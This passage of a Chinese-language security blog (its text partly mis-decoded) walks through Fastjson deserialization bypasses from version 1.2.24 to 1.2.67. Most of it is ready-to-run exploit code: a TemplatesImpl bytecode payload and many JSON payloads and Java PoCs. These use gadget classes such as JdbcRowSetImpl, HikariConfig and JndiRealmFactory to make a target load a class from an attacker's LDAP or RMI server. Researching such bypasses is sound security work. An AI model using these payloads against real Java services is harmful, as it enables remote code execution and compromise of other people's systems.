class="line"> String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +  </span><br><span class="line">                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;;  </span><br><span class="line"> System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line"> Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span><br><span class="line"> //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  </span><br><span class="line"> &#125; catch (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;FastjsonEXP_1.2.24&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">		 xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">		 xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">	&lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;FastjsonEXP_1.2.24&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">		&lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-25åˆ†æ"><a href="#1-2-25åˆ†æ" class="headerlink" title="-1.2.25åˆ†æ"></a>-1.2.25åˆ†æ</h2><p>æ·»åŠ å¦‚ä¸‹ğŸ‘‡åŒæ—¶è¿˜æœ‰å…¶ä»–çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>DefaultJSONParser.parseObject()å‡½æ•°ä¸­çš„<code>TypeUtils.loadClass</code>æ›¿æ¢ä¸ºcheckAutoType()å‡½æ•°ï¼š</p>
<p><code>checkAutoType()</code>å‡½æ•°è®¾ç½®äº†é»‘ç™½åå•ï¼Œ</p>
<p>acceptListä¸ºç™½åå•ï¼ˆé»˜è®¤ä¸ºç©ºï¼Œå¯æ‰‹åŠ¨æ·»åŠ ï¼‰ï¼ŒdenyListä¸ºé»‘åå•ï¼ˆé»˜è®¤ä¸ä¸ºç©ºï¼‰</p>
<h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p><code>checkAutoType()</code>å‡½æ•°å‡ºç°åParserConfig.javaä¸­æ–°å¢çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œåœ¨<code>checkAutoType()</code>å‡½æ•°çš„æŸäº›ä»£ç é€»è¾‘èµ·åˆ°å¼€å…³çš„ä½œç”¨</p>
<p>é»˜è®¤æƒ…å†µä¸‹autoTypeSupportä¸ºFalseï¼Œå°†å…¶è®¾ç½®ä¸ºTrueæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>ï¼Œå¦‚æœæœ‰ä½¿ç”¨éå…¨å±€ParserConfigåˆ™ç”¨å¦å¤–è°ƒç”¨<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoTypeç™½åå•è®¾ç½®æ–¹æ³•ï¼š</p>
<ol>
<li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
<li>é€šè¿‡fastjson.propertiesæ–‡ä»¶é…ç½®ã€‚åœ¨1.2.25&#x2F;1.2.26ç‰ˆæœ¬æ”¯æŒé€šè¿‡ç±»è·¯å¾„çš„fastjson.propertiesæ–‡ä»¶æ¥é…ç½®ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
</ol>
<h2 id="25-41"><a href="#25-41" class="headerlink" title="25-41"></a>25-41</h2><h3 id="è¡¥ä¸ç»•è¿‡"><a href="#è¡¥ä¸ç»•è¿‡" class="headerlink" title="è¡¥ä¸ç»•è¿‡"></a>è¡¥ä¸ç»•è¿‡</h3><h3 id="42å¼€å§‹ä»¥hashé»‘åå•"><a href="#42å¼€å§‹ä»¥hashé»‘åå•" class="headerlink" title="42å¼€å§‹ä»¥hashé»‘åå•"></a>42å¼€å§‹ä»¥hashé»‘åå•</h3><h4 id="25-42"><a href="#25-42" class="headerlink" title="25-42"></a>25-42</h4><p>å¼€å¤´Lç»“å°¾;åŒå†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, </span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-43"><a href="#25-43" class="headerlink" title="25-43"></a>25-43</h4><p>ä»¥ <code>â€[â€œ</code>å¼€å¤´</p>
<p>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-45"><a href="#25-45" class="headerlink" title="25-45"></a>25-45</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line">// Fastjson 1.2.41 ç‰ˆæœ¬çš„ç»•è¿‡  </span><br><span class="line">public class SuccessBypassEXP_45 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1234/Exploit\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="25-47"><a href="#25-47" class="headerlink" title="25-47"></a>25-47</h4><p>é€šè¿‡ java.lang.Classï¼Œå°†JdbcRowSetImplç±»åŠ è½½åˆ°Mapä¸­ç¼“å­˜ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚å› æ­¤å°†payloadåˆ†ä¸¤æ¬¡å‘é€ï¼Œç¬¬ä¸€æ¬¡åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°æ²¡æœ‰åŠ è½½åˆ°ç¼“å­˜çš„ç±»ï¼Œ<code>checkAutoType()</code>å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line">public class JdbcRowSetImplPoc &#123;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        String payload  = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span><br><span class="line">                + &quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><br><span class="line">                + &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="49"><a href="#49" class="headerlink" title="49"></a>49</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FJ 1.2.49å¼€å§‹ï¼ŒJSONArrayå’ŒJSONObjectå¼€å§‹é‡å†™äº†resolveClassï¼Œè¿‡æ»¤äº†è¯¸å¦‚TemplatesImplçš„å±é™©ç±»</span><br></pre></td></tr></table></figure>



<h4 id="5-59"><a href="#5-59" class="headerlink" title="5-59"></a>5-59</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">æˆ–</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-60"><a href="#5-60" class="headerlink" title="5-60"></a>5-60</h4><p><strong>éœ€è¦å¼€å¯ autoTypeï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-61"><a href="#5-61" class="headerlink" title="5-61"></a>5-61</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploi</span><br></pre></td></tr></table></figure>



<h3 id="1-48"><a href="#1-48" class="headerlink" title="1.48"></a>1.48</h3><p>1.2.48ä¸­çš„ä¿®å¤æªæ–½æ˜¯ï¼Œåœ¨<code>loadClass()</code>æ—¶ï¼Œå°†ç¼“å­˜å¼€å…³é»˜è®¤ç½®ä¸ºFalseï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¸èƒ½é€šè¿‡ClassåŠ è½½è¿›ç¼“å­˜äº†ã€‚åŒæ—¶å°†Classç±»åŠ å…¥åˆ°äº†é»‘åå•ä¸­ã€‚</p>
<h4 id="åˆå§‹åˆ†æ"><a href="#åˆå§‹åˆ†æ" class="headerlink" title="åˆå§‹åˆ†æ"></a>åˆå§‹åˆ†æ</h4><p>ä»1.2.42ç‰ˆæœ¬å¼€å§‹ï¼ŒFastjsonæŠŠåŸæœ¬æ˜æ–‡å½¢å¼çš„é»‘åå•æ”¹æˆäº†å“ˆå¸Œè¿‡çš„é»‘åå•ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶è€…å¯¹å…¶è¿›è¡Œç ”ç©¶ï¼Œæé«˜æ¼æ´åˆ©ç”¨é—¨æ§›ï¼Œä½†æ˜¯æœ‰äººå·²åœ¨Githubä¸Šè·‘å‡ºäº†å¤§éƒ¨åˆ†é»‘åå•åŒ…ç±»ï¼š<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j2;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class SuccessBypassEXP &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/myVlypbG\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216154307874.png?raw=true" alt="image-20250216154307874"></p>
<p>ç„¶åè¿›å…¥loadclass</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216155114297.png?raw=true" alt="image-20250216155114297"></p>
<p>ldapåè¿æ²¡å¥½ä½¿ï¼Œç›´æ¥ç”¨yakitæ</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250216163744869.png?raw=true" alt="image-20250216163744869"></p>
<h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><ul>
<li>éœ€è¦å¼€å¯AutoTypeï¼›</li>
<li>Fastjson &lt;&#x3D; 1.2.62ï¼›</li>
<li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li>
<li>ç›®æ ‡æœåŠ¡ç«¯éœ€è¦å­˜åœ¨xbean-reflectåŒ…ï¼›xbean-reflect åŒ…çš„ç‰ˆæœ¬ä¸é™</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j4;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class PoC_1_2_62 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8085/qNdKjUrh\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>org.apache.cocoon.components.slide.impl.JMSContentInterceptorç±»PoCï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h3><ul>
<li>å¼€å¯AutoTypeï¼›</li>
<li>Fastjson &lt;&#x3D; 1.2.66ï¼›</li>
<li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li>
<li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreåŒ…ï¼›</li>
<li>br.com.anteros.dbcp.AnterosDBCPConfig ç±»éœ€è¦ Anteros-Coreå’Œ Anteros-DBCP åŒ…ï¼›</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»éœ€è¦ibatis-sqlmapå’ŒjtaåŒ…ï¼›</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line">public class EXP_1266 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span><br><span class="line">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h3><ul>
<li>å¼€å¯AutoTypeï¼›</li>
<li>Fastjson &lt;&#x3D; 1.2.67ï¼›</li>
<li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookupç±»éœ€è¦ignite-coreã€ignite-jtaå’Œjtaä¾èµ–ï¼›</li>
<li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreå’Œslf4j-apiä¾èµ–ï¼›</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">import com.sun.xml.internal.ws.api.ha.StickyFeature;  </span><br><span class="line">  </span><br><span class="line">public class EXP_1267 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot; +  </span><br><span class="line">                &quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><ul>
